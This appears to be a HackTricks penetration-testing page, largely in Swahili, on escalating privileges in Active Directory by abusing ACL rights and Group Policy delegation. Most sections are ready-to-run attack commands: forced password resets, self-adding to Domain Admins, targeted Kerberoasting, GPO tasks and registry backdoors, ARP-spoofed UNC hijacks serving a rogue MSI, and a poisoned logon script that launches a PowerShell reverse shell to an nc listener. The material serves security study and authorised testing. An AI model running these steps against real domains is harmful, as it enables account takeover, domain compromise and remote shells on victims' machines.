# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ukurasa huu kwa kiasi kikubwa ni muhtasari wa techniques kutoka** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **na** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Kwa maelezo zaidi, angalia makala asili.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Privilege hii humpa attacker udhibiti kamili wa akaunti ya user anayelengwa. Baada ya kuthibitisha rights za `GenericAll` kwa kutumia command ya `Get-ObjectAcl`, attacker anaweza:

- **Change the Target's Password**: Kwa kutumia `net user <username> <password> /domain`, attacker anaweza kuweka upya password ya user.
- Kutoka Linux, unaweza kufanya hivyo hivyo kupitia SAMR kwa kutumia Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Ikiwa akaunti imezimwa, ondoa flag ya UAC**: `GenericAll` inaruhusu kuhariri `userAccountControl`. Kutoka Linux, BloodyAD inaweza kuondoa flag ya `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Weka SPN kwenye akaunti ya user ili iweze kufanyiwa kerberoast, kisha tumia Rubeus na targetedKerberoast.py kutoa na kujaribu kuvunja hashes za ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Zima pre-authentication kwa mtumiaji, na kufanya akaunti yake iwe katika hatari ya ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Ukiwa na `GenericAll` kwenye user, unaweza kuongeza certificate-based credential na ku-authenticate kama yeye bila kubadilisha password yake. Angalia:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Privilege hii humruhusu attacker kubadilisha group memberships ikiwa ana `GenericAll` rights kwenye group kama `Domain Admins`. Baada ya kutambua distinguished name ya group kwa kutumia `Get-NetGroup`, attacker anaweza:

- **Add Themselves to the Domain Admins Group**: Hili linaweza kufanywa kupitia direct commands au kwa kutumia modules kama Active Directory au PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Kutoka Linux unaweza pia kutumia BloodyAD kujiongeza kwenye groups zozote unapokuwa na GenericAll/Write membership juu yake. Ikiwa target group imewekwa ndani ya “Remote Management Users”, utapata mara moja WinRM access kwenye hosts zinazoheshimu group hiyo:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Kuwa na privileges hizi kwenye computer object au user account huwezesha:

- **Kerberos Resource-based Constrained Delegation**: Huwawezesha kuchukua udhibiti wa computer object.
- **Shadow Credentials**: Tumia technique hii ku-impersonate computer au user account kwa kutumia vibaya privileges za kuunda shadow credentials.

## **WriteProperty on Group**

Ikiwa user ana haki za `WriteProperty` kwenye objects zote za group maalum (kwa mfano, `Domain Admins`), anaweza:

- **Add Themselves to the Domain Admins Group**: Inawezekana kwa kuchanganya commands za `net user` na `Add-NetGroupUser`; method hii huwezesha privilege escalation ndani ya domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) kwenye Group**

Ruhusa hii huwawezesha attackers kujiongeza kwenye groups maalum, kama vile `Domain Admins`, kupitia commands zinazobadilisha uanachama wa group moja kwa moja. Kutumia mfuatano wa commands ufuatao huruhusu kujiongeza mwenyewe:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Ruhusa inayofanana, hii huwawezesha attackers kujiongeza moja kwa moja kwenye groups kwa kurekebisha properties za groups ikiwa wana right ya `WriteProperty` kwenye groups hizo. Uthibitishaji na utekelezaji wa ruhusa hii hufanywa kwa:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Kuwa na `ExtendedRight` kwa user kwa ajili ya `User-Force-Change-Password` huruhusu kuweka upya password bila kujua password ya sasa. Uthibitishaji wa haki hii na exploitation yake unaweza kufanywa kupitia PowerShell au command-line tools mbadala, zikitoa mbinu kadhaa za kuweka upya password ya user, ikiwa ni pamoja na interactive sessions na one-liners kwa mazingira yasiyo ya interactive. Commands zinaanzia PowerShell invocations rahisi hadi kutumia `rpcclient` kwenye Linux, zikionyesha versatility ya attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Ikiwa mshambuliaji atagundua kuwa ana ruhusa za `WriteOwner` juu ya Group, anaweza kubadilisha umiliki wa Group hiyo na kujifanya mmiliki. Hili huwa na athari kubwa hasa Group inayohusika ikiwa ni `Domain Admins`, kwa sababu kubadilisha umiliki huruhusu udhibiti mpana zaidi wa sifa na uanachama wa Group. Mchakato huu unahusisha kutambua object sahihi kupitia `Get-ObjectAcl`, kisha kutumia `Set-DomainObjectOwner` kubadilisha mmiliki, kwa kutumia SID au jina.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Ruhusa hii humwezesha attacker kurekebisha user properties. Hasa, akiwa na access ya `GenericWrite`, attacker anaweza kubadilisha logon script path ya user ili kutekeleza script hasidi user anapoingia. Hili hufanywa kwa kutumia command ya `Set-ADObject` kusasisha property ya `scriptpath` ya target user ili ielekeze kwenye script ya attacker.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Kwa privilege hii, attackers wanaweza kudhibiti uanachama wa group, kama vile kujiongeza wenyewe au kuongeza users wengine kwenye groups maalum. Mchakato huu unahusisha kuunda credential object, kuitumia kuongeza au kuondoa users kwenye group, na kuthibitisha mabadiliko ya uanachama kwa kutumia PowerShell commands.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Kutoka Linux, Samba `net` inaweza kuongeza/kuondoa wanachama unapokuwa na `GenericWrite` kwenye group (hii ni muhimu wakati PowerShell/RSAT hazipatikani):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Kumiliki object ya AD na kuwa na privileges za `WriteDACL` juu yake humwezesha attacker kujipa privileges za `GenericAll` juu ya object hiyo. Hili hutimizwa kupitia ADSI manipulation, na kumpa udhibiti kamili juu ya object hiyo pamoja na uwezo wa kurekebisha uanachama wake katika group. Hata hivyo, kuna vikwazo unapojaribu kutumia privileges hizi kupitia cmdlets za `Set-Acl` / `Get-Acl` za Active Directory module.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner takeover ya haraka (PowerView)

Unapokuwa na `WriteOwner` na `WriteDacl` juu ya user au service account, unaweza kupata full control na reset password yake ukitumia PowerView bila kujua password ya zamani:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Kumbuka:
- Huenda ukahitaji kwanza kubadilisha owner kuwa wewe mwenyewe ikiwa una `WriteOwner` pekee:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Thibitisha access kwa kutumia protocol yoyote (SMB/LDAP/RDP/WinRM) baada ya password reset.

## **Replication kwenye Domain (DCSync)**

DCSync attack hutumia replication permissions maalum kwenye domain ili kuiga Domain Controller na kusynchronize data, ikiwemo user credentials. Technique hii yenye nguvu inahitaji permissions kama `DS-Replication-Get-Changes`, inayowaruhusu attackers kutoa taarifa nyeti kutoka kwenye AD environment bila access ya moja kwa moja kwa Domain Controller.<sup>[[5]](#references)</sup> [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Access iliyodelegatiwa ya kusimamia Group Policy Objects (GPOs) inaweza kuleta security risks kubwa. Kwa mfano, ikiwa user kama `offense\spotless` amepewa delegated GPO management rights, anaweza kuwa na privileges kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Permissions hizi zinaweza kutumiwa vibaya kwa madhumuni ya malicious, kama ilivyotambuliwa kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Ili kutambua GPOs zilizosanidiwa vibaya, PowerSploit's cmdlets zinaweza kuunganishwa pamoja. Hii huruhusu kugundua GPOs ambazo user maalum ana permissions za kuzisimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Inawezekana kubaini ni computers zipi GPO maalum inatumika, jambo linalosaidia kuelewa scope ya potential impact. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Ili kuona policies zinazotumika kwenye computer fulani, commands kama `Get-DomainGPO` zinaweza kutumika.

**OUs with a Given Policy Applied**: Kutambua organizational units (OUs) zinazoathiriwa na policy fulani kunaweza kufanywa kwa kutumia `Get-DomainOU`.

Unaweza pia kutumia tool [**GPOHound**](https://github.com/cogiceo/GPOHound) ku-enumerate GPOs na kupata issues ndani yake.

### Abuse GPO - New-GPOImmediateTask

GPOs zilizosanidiwa vibaya zinaweza kutumiwa vibaya ku-execute code, kwa mfano, kwa kuunda immediate scheduled task. Hii inaweza kufanywa ili kuongeza user kwenye local administrators group kwenye machines zilizoathiriwa, na hivyo kuongeza privileges kwa kiwango kikubwa:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, ikiwa imewekwa, inaruhusu kuunda na ku-link GPO mpya, pamoja na kuweka preferences kama vile registry values ili ku-execute backdoors kwenye computers zilizoathirika. Method hii inahitaji GPO isasishwe na user a-login kwenye computer ili execution ifanyike:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse hutoa mbinu ya kutumia vibaya GPO zilizopo kwa kuongeza tasks au kurekebisha settings bila hitaji la kuunda GPO mpya. Tool hii inahitaji kurekebisha GPO zilizopo au kutumia RSAT tools kuunda mpya kabla ya kutumia mabadiliko:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Lazimisha Sasisho la Sera

GPO updates kwa kawaida hutokea takriban kila dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kutekeleza mabadiliko, amri ya `gpupdate /force` inaweza kutumiwa kwenye kompyuta lengwa ili kulazimisha sasisho la sera mara moja. Amri hii huhakikisha kwamba marekebisho yoyote kwenye GPO yanatumika bila kusubiri mzunguko unaofuata wa sasisho la kiotomatiki.

### Kwa Ndani

Baada ya kukagua Scheduled Tasks za GPO fulani, kama vile `Misconfigured Policy`, kuongezwa kwa tasks kama `evilTask` kunaweza kuthibitishwa. Tasks hizi huundwa kupitia scripts au zana za command-line zinazolenga kurekebisha tabia ya mfumo au kuongeza privileges.

Muundo wa task, kama unavyoonyeshwa katika faili la usanidi la XML linalozalishwa na `New-GPOImmediateTask`, unaeleza maelezo ya scheduled task - ikiwa ni pamoja na amri itakayotekelezwa na triggers zake. Faili hili linaonyesha jinsi scheduled tasks zinavyofafanuliwa na kudhibitiwa ndani ya GPOs, likitoa njia ya kutekeleza amri au scripts za kiholela kama sehemu ya utekelezaji wa sera.

### Watumiaji na Vikundi

GPOs pia huruhusu kudhibiti uanachama wa watumiaji na vikundi kwenye mifumo lengwa. Kwa kuhariri moja kwa moja faili za sera za Users and Groups, attackers wanaweza kuongeza users kwenye vikundi vyenye privileges, kama vile kikundi cha ndani cha `administrators`. Hili linawezekana kupitia delegation ya permissions za usimamizi wa GPO, inayoruhusu kurekebisha faili za sera ili kujumuisha users wapya au kubadilisha uanachama wa vikundi.

Faili la usanidi la XML la Users and Groups linaeleza jinsi mabadiliko haya yanavyotekelezwa. Kwa kuongeza entries kwenye faili hili, users mahususi wanaweza kupewa privileges zilizoinuliwa kwenye mifumo iliyoathiriwa. Njia hii hutoa mbinu ya moja kwa moja ya privilege escalation kupitia GPO manipulation.

Zaidi ya hayo, mbinu nyingine za kutekeleza code au kudumisha persistence, kama vile kutumia logon/logoff scripts, kurekebisha registry keys kwa autoruns, kusakinisha software kupitia faili za .msi, au kuhariri service configurations, pia zinaweza kuzingatiwa. Techniques hizi hutoa njia mbalimbali za kudumisha access na kudhibiti mifumo lengwa kupitia abuse ya GPOs.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` kwenye OU/domain hukuruhusu kurekebisha attribute ya `gPLink` ya container lengwa na **kulazimisha GPO iliyopo itumike** bila kuhariri GPO yenyewe. Hili huwa muhimu wakati GPO iliyounganishwa tayari inarejelea content ya mbali kupitia **UNC paths** (`\\HOST\share\...`), kwa sababu authenticated users wanaweza kusoma **SYSVOL** na kutafuta policies zinazoweza kutumiwa tena offline.<sup>[[11]](#references)</sup>

High-level workflow:

1. Tumia BloodHound kutambua principal aliye na `WriteGPLink` kwenye OU na kuorodhesha computers/users walio ndani ya OU hiyo.
2. Clone `SYSVOL` katika hali ya read-only na parse GPOs ukitafuta **Software Installation**, **drive mappings** (`Drives.xml`), na **logon/startup scripts** zinazorejelea UNC paths.
3. Pendelea policies zinazoelekeza kwenye **direct hostname** (kwa mfano `\\DC02\share\pkg.msi`) badala ya DFS/domain-namespace paths, kwa sababu hostname-based paths ni rahisi kuelekezwa upya kwa L2 spoofing.
4. Ongeza GPO GUID iliyochaguliwa kwenye `gPLink` ya OU lengwa ili victim ichakate policy hiyo iliyopo tayari.
5. Kwenye broadcast domain hiyo hiyo, ARP spoof UNC host na u-bind IP yake locally (`ip addr add <target_ip>/32 dev <iface>`) ili SMB traffic ya victim ifikie host yako.
6. Serve path/filename inayotarajiwa kutoka kwa attacker SMB server (kwa mfano `smbserver.py`) na usubiri policy processing ya kawaida.

Mfano wa ukusanyaji wa `SYSVOL` na GPO correlation:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Link GPO iliyopo kwenye OU lengwa:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Ikiwa GPO iliyounganishwa inadeploy MSI kutoka kwenye UNC path, client ita-fetch MSI hiyo wakati wa **computer startup** na kui-install kama **`NT AUTHORITY\SYSTEM`**. Kwa ku-spoof host iliyorejelewa na ku-serve MSI hasidi chini ya **share/path/name** hiyo hiyo, unaweza kubadilisha `WriteGPLink` kuwa code execution ya SYSTEM **bila kurekebisha SYSVOL**.

Vikwazo muhimu:

- **Timing matters**: link mpya huonekana wakati wa policy refresh (kwa kawaida baada ya takriban dakika 90), lakini **Software Installation** kwa kawaida hu-trigger wakati wa **reboot**.
- Windows Installer kwa kawaida hufuatilia deployment kwa kutumia **`ProductCode`** ya package. Ikiwa product tayari ime-installiwa, deployment inaweza kurukwa.
- Ili kuepuka installer kuikataa, patch MSI rogue ili **`ProductCode`** na **`PackageCode`** zake zilingane na zile za package halali inayotarajiwa na GPO.
- Faili za zamani za `.aas` za advertisement zinaweza kubaki kwenye `SYSVOL`, kwa hivyo thibitisha kuwa deployment bado inaonekana kuwa active kabla ya kuitegemea.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings katika `Drives.xml` husababisha users ku-authenticate kwenye UNC path iliyosanidiwa wakati wa logon au reconnection. Ukispoof host iliyorejelewa, unaweza kukamata **NetNTLMv2**. Ikiwa SMB itafanywa ishindwe kwa makusudi, Windows inaweza kujaribu tena kupitia **WebDAV**, ikituma **NTLM over HTTP**, ambayo ni rahisi zaidi kutumika kwa relays kwenda **LDAP(S)**, **AD CS**, au **SMB**.

#### Logon/startup script UNC hijack

Pattern hiyo hiyo inatumika kwa scripts zinazohifadhiwa kwenye UNC na kugunduliwa katika `SYSVOL`:

- **Logon scripts** kwa kawaida hutekelezwa katika context ya **user**.
- **Startup scripts** kwa kawaida hutekelezwa katika context ya **computer / SYSTEM**.

Ikiwa script path inaelekeza kwenye hostname inayoweza ku-spoofiwa, redirect UNC host na u-serve replacement script content kutoka location inayotarajiwa.

## SYSVOL/NETLOGON Logon Script Poisoning

Paths zinazoweza kuandikwa chini ya `\\<dc>\SYSVOL\<domain>\scripts\` au `\\<dc>\NETLOGON\` huruhusu kubadilisha logon scripts zinazotekelezwa wakati wa user logon kupitia GPO. Hii husababisha code execution katika security context ya users wanao-log in.

### Locate logon scripts
- Kagua user attributes ili kupata logon script iliyosanidiwa:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Crawl domain shares ili kubaini shortcuts au marejeo ya scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Changanua faili za `.lnk` ili kutatua targets zinazoelekeza kwenye SYSVOL/NETLOGON (mbinu muhimu ya DFIR na kwa attackers wasio na ufikiaji wa moja kwa moja wa GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound huonyesha attribute ya `logonScript` (scriptPath) kwenye nodes za user inapopatikana.

### Thibitisha write access (usiutegee orodha za shares)
Automated tooling inaweza kuonyesha SYSVOL/NETLOGON kama read-only, lakini NTFS ACL za msingi bado zinaweza kuruhusu writes. Daima fanya jaribio:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Ikiwa file size au mtime inabadilika, una write. Hifadhi nakala za asili kabla ya kufanya marekebisho.

### Poison a VBScript logon script for RCE
Ongeza command inayozindua PowerShell reverse shell (itengeneze kutoka revshells.com) na uhifadhi logic ya awali ili kuepuka kuvuruga business function:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Sikiliza kwenye host yako na usubiri kuingia kwa mwingiliano kunakofuata:
```bash
rlwrap -cAr nc -lnvp 443
```
Notes:
- Utekelezaji hutokea chini ya token ya mtumiaji anayefanya logging (si SYSTEM). Scope ni kiungo cha GPO (OU, site, domain) kinachotumia script hiyo.
- Safisha kwa kurejesha content/timestamps za awali baada ya matumizi.


## References

- [1] [Kudhulumu Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Akaunti zenye Privileges na Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Sasisho la ACL Attack Path](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Kuongeza privileges kwa ACLs katika Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Kuchanganua Active Directory Privileges na Akaunti zenye Privileges](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD attribute/UAC operations kutoka Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, na DPAPI decryption hadi DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths kwa Code Execution na NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
